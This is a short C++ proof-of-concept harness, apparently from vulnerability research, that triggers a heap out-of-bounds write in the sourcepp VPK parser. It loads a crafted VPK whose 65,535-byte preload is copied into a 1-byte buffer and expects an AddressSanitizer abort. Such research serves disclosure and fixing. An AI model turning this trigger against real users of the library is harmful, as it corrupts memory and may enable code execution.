// C1 PoC harness — sourcepp VPK readEntry preload-vs-compressedLength OOB write.
// Opens the crafted v54 dir VPK and reads the single entry; the 65,535-byte
// preload is copied into a 1-byte heap buffer (VPK.cpp:334-338).
#include <cstdio>

#include <vpkpp/format/VPK.h>

using namespace vpkpp;

int main(int argc, char** argv) {
	const auto path = argc > 1 ? argv[1] : "/home/box/sourcepp-hunt/poc/c1-preload-overflow.vpk";
	std::printf("[*] opening %s\n", path);
	std::unique_ptr<PackFile> packFile = VPK::open(path);
	if (!packFile) {
		std::printf("[!] open() returned nullptr — no entries parsed\n");
		return 1;
	}
	std::printf("[*] open OK (version %u), reading entry 'a.txt'...\n",
	            dynamic_cast<VPK*>(packFile.get())->getVersion());
	auto entry = packFile->readEntry("a.txt");
	if (entry) {
		std::printf("[*] readEntry returned %zu bytes (expected: ASAN abort before this line)\n", entry->size());
	} else {
		std::printf("[!] readEntry returned nullopt\n");
	}
	return 0;
}